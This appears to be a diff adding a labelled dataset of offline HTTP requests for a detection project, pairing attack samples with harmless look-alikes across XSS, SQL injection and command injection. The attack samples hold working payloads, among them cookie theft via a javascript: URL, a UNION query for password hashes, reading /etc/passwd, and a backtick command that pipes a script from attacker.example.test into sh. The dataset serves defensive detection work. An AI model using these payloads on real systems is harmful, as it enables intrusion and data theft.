@@ -1,0 +1,153 @@
+#@@ bundle aegisforge-dev offline HTTP requests (AI-authored, human_review pending; see ../manifest.json)
+#@@ Each request starts at the first non-blank line after its delimiter; a header-only request
+#@@ gets its terminating blank line from the loader. Hosts use reserved .test names only.
+
+#@@ sample HTTP-XSS-01-A
+GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
+Host: shop.example.test
+User-Agent: Mozilla/5.0
+Accept: text/html
+
+#@@ sample HTTP-XSS-01-N
+GET /search?q=I+%3C3+handmade+mugs HTTP/1.1
+Host: shop.example.test
+User-Agent: Mozilla/5.0
+Accept: text/html
+
+#@@ sample HTTP-XSS-02-A
+POST /api/profile HTTP/1.1
+Host: app.example.test
+Content-Type: application/json
+
+{"display_name": "<img src=x onerror=alert(1)>", "bio": "hello"}
+
+#@@ sample HTTP-XSS-02-N
+POST /api/profile HTTP/1.1
+Host: app.example.test
+Content-Type: application/json
+
+{"display_name": "Ada", "bio": "Uploaded avatar image.png; see the img folder"}
+
+#@@ sample HTTP-XSS-03-A
+POST /feedback HTTP/1.1
+Host: support.example.test
+Content-Type: application/x-www-form-urlencoded
+
+email=user%40example.test&message=%253Csvg%2520onload%253Dalert%25281%2529%253E
+
+#@@ sample HTTP-XSS-03-N
+POST /feedback HTTP/1.1
+Host: support.example.test
+Content-Type: application/x-www-form-urlencoded
+
+email=user%40example.test&message=Tom+%26+Jerry+%3D+classic%3B+100%25+agree
+
+#@@ sample HTTP-XSS-04-A
+GET /login?next=javascript%3Aalert(document.cookie) HTTP/1.1
+Host: portal.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-04-N
+GET /login?next=%2Faccount%2Fsettings%3Ftab%3Dsecurity HTTP/1.1
+Host: portal.example.test
+Accept: text/html
+
+#@@ sample HTTP-SQLI-01-A
+GET /products?category=1%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-01-N
+GET /products?category=travel&q=union+station+tote+bag HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-02-A
+POST /login HTTP/1.1
+Host: portal.example.test
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=%27+or+%271%27%3D%271
+
+#@@ sample HTTP-SQLI-02-N
+POST /login HTTP/1.1
+Host: portal.example.test
+Content-Type: application/x-www-form-urlencoded
+
+username=oneil&password=O%27Neil-2024%21
+
+#@@ sample HTTP-SQLI-03-A
+POST /api/orders/lookup HTTP/1.1
+Host: shop.example.test
+Content-Type: application/json
+
+{"order_id": "1001 AND SLEEP(5)", "email": "a@example.test"}
+
+#@@ sample HTTP-SQLI-03-N
+POST /api/orders/lookup HTTP/1.1
+Host: shop.example.test
+Content-Type: application/json
+
+{"order_id": "1001", "note": "Please deliver after 6pm, I need to sleep in."}
+
+#@@ sample HTTP-SQLI-04-A
+GET /dashboard HTTP/1.1
+Host: app.example.test
+Cookie: theme=dark; tracking_id=42' AND '1'='1
+Accept: text/html
+
+#@@ sample HTTP-SQLI-04-N
+GET /dashboard HTTP/1.1
+Host: app.example.test
+Cookie: theme=dark; tracking_id=42; lang=en-GB
+Accept: text/html
+
+#@@ sample HTTP-CMDI-01-A
+GET /tools/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1
+Host: admin.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-01-N
+GET /tools/ping?host=db-replica-2.internal.example.test HTTP/1.1
+Host: admin.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-02-A
+POST /reports/export HTTP/1.1
+Host: admin.example.test
+Content-Type: application/x-www-form-urlencoded
+
+name=q3-report%24%28whoami%29&format=pdf
+
+#@@ sample HTTP-CMDI-02-N
+POST /reports/export HTTP/1.1
+Host: admin.example.test
+Content-Type: application/x-www-form-urlencoded
+
+name=q3-report&format=pdf&note=Budget+%2410k+approved
+
+#@@ sample HTTP-CMDI-03-A
+POST /api/hooks HTTP/1.1
+Host: ci.example.test
+Content-Type: application/json
+
+{"branch": "main`curl http://attacker.example.test/x.sh|sh`", "notify": true}
+
+#@@ sample HTTP-CMDI-03-N
+POST /api/hooks HTTP/1.1
+Host: ci.example.test
+Content-Type: application/json
+
+{"branch": "main", "notify": true, "comment": "Run `npm install` before building"}
+
+#@@ sample HTTP-CMDI-04-A
+GET /status HTTP/1.1
+Host: api.example.test
+User-Agent: monitor/1.0 && id
+Accept: application/json
+
+#@@ sample HTTP-CMDI-04-N
+GET /status HTTP/1.1
+Host: api.example.test
+User-Agent: monitor/1.0 (compatible; uptime-check)
+Accept: application/json
